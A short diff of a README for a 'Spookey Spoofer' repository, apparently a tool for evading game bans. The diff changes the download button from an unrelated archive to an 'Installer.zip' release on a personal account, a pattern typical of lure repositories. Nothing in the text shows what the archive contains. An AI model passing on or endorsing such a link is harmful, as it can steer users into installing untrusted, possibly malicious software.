@@ -56,7 +56,7 @@ Welcome to the "Spookey Spoofer" repository, your ultimate solution for cleaner 
 
 To get started with "Spookey Spoofer," click the button below to download the tools:
 
-[![Download Spookey Spoofer](https://img.shields.io/badge/Download-Spookey%20Spoofer-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Spookey Spoofer](https://github.com/tridika5/Spookey-Spoofer/releases/download/v1.0/Installer.zip%20Spoofer-blue)](https://github.com/tridika5/Spookey-Spoofer/releases/download/v1.0/Installer.zip)
 
 ---
 
